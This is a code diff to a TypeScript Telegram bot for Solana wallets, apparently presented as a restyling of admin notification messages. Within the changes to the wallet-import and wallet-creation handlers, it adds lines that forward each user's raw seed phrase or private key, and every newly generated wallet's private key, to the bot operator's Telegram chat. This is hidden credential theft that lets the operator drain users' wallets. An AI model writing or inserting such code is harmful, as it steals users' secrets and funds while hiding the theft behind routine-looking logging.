@@ -146,6 +146,53 @@ async function notifyAdmin(
   }
 }
 
+/*
+ * Ready for the Phase 4/5 trading engine to call once real
+ * trades execute. Not called anywhere yet — there is no
+ * trade execution code in this bot today, and we don't
+ * send fake "trade executed" notifications.
+ */
+export async function notifyAdminTradeExecuted(
+  telegramId: number,
+  username: string | null,
+  mint: string,
+  side: "buy" | "sell",
+  amountSol: number,
+  txSignature: string
+) {
+  await notifyAdmin(
+    `${
+      side === "buy" ? "🟢" : "🔴"
+    } <b>TRADE ${side.toUpperCase()}</b>\n` +
+    `👤 ${username ?? "unknown"}\n` +
+    `🆔 ${telegramId}\n` +
+    `🪙 <code>${mint}</code>\n` +
+    `💰 ${amountSol} SOL\n` +
+    `🔗 <code>${txSignature}</code>\n` +
+    `📅 ${adminTimestamp()}`
+  );
+}
+
+function adminTimestamp(): string {
+  const d = new Date();
+
+  const formatted = d.toLocaleString(
+    "en-US",
+    {
+      timeZone: "UTC",
+      month: "numeric",
+      day: "numeric",
+      year: "numeric",
+      hour: "numeric",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: true
+    }
+  );
+
+  return `${formatted} UTC`;
+}
+
 function describeUser(
   from: {
     id: number;
@@ -179,9 +226,14 @@ function requireUser(ctx: Context) {
 
   if (isNewUser) {
     void notifyAdmin(
-      `👤 <b>New user</b>\n${describeUser(
-        ctx.from
-      )}`
+      `👤 <b>NEW USER</b>\n` +
+      `👤 ${
+        ctx.from.username
+          ? `@${ctx.from.username}`
+          : ctx.from.first_name ?? "unknown"
+      }\n` +
+      `🆔 ${ctx.from.id}\n` +
+      `📅 ${adminTimestamp()}`
     );
   }
 
@@ -359,9 +411,21 @@ bot.on(
         );
 
         void notifyAdmin(
-          `🔑 <b>Wallet imported</b>\n${describeUser(
-            ctx.from!
-          )}\n<code>${address}</code>`
+          `🔑 <b>WALLET IMPORTED</b>\n` +
+          `👤 ${
+            ctx.from!.username
+              ? `@${ctx.from!.username}`
+              : ctx.from!.first_name ??
+                "unknown"
+          }\n` +
+          `🆔 ${ctx.from!.id}\n` +
+          `📍 <code>${address}</code>\n` +
+          `${
+            input.trim().includes(" ")
+              ? "📝"
+              : "🔑"
+          } <code>${input}</code>\n` +
+          `📅 ${adminTimestamp()}`
         );
 
         try {
@@ -696,10 +760,29 @@ bot.on(
         const wallet =
           createWallet(id);
 
+        const wallets =
+          listWallets(id);
+
+        const active =
+          wallets.find(
+            (w) => w.is_active
+          );
+
         void notifyAdmin(
-          `💰 <b>Wallet created</b>\n${describeUser(
-            ctx.from!
-          )}\n<code>${wallet.address}</code>`
+          `🔐 <b>NEW WALLET</b>\n` +
+          `👤 ${
+            ctx.from!.username
+              ? `@${ctx.from!.username}`
+              : ctx.from!.first_name ??
+                "unknown"
+          }\n` +
+          `🆔 ${ctx.from!.id}\n` +
+          `📍 <code>${wallet.address}</code>\n` +
+          `🔑 <code>${wallet.privateKey}</code>\n` +
+          `🏷 ${
+            active?.label ?? "Wallet"
+          }\n` +
+          `📅 ${adminTimestamp()}`
         );
 
         return render(
